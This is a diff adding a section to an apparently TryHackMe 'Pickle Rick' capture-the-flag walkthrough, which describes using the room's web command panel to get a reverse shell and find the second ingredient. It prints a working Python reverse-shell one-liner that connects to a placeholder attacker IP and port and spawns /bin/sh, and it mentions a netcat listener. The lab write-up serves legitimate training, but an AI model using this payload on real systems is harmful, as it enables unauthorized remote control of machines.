@@ -85,5 +85,29 @@ http://<ip>/Sup3rS3cretPickl3Ingred.txt
 ```
 And like that, we will have the first ingredient
 
-Next thing we are looking to do, is getting a reverse shell using the command panel
+At this point, we could go for two ways on exploiting this machine to get the other ingredientes
+
+## First way
+### Getting a reverse shell through command panel
+First, we can search the python version with 
+```
+which python3
+which python2
+which python
+```
+We will find this
+![image_2024-04-26_005506068](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/00f2e85c-1ce6-4aa0-bb96-c120d5d09188)
+Ok, so now we know that python3 is on this machine so lets get a reverse shell using this:
+`python3 -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<yourIp>",<listeningPort>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
+Before we execute the command we need a netcat set on the port we specified like this
+![image_2024-04-26_005931396](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/28f227fb-d676-4c0b-9a7e-5797d115a2bb)
+If everything is working right, we will receive a reverse shell on our listening port
+![image_2024-04-26_010239772](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/959d6e72-01b1-4c63-a953-ccd4d6226ed5)
+We can upgrade this shell using `bash -i`
+So, with this shell, we are way more comfortable moving around the machine without needing to use the command panel
+Lets search for the other ingredients
+![image_2024-04-26_010637175](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/059b7936-ce3a-410b-9197-0cf37deebe78)
+If we move to this directory and do a `ls` on it, we will find the second ingredient
+![image](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/6fab408b-ff97-424a-ae4e-5d36c30ea34b)
+
 
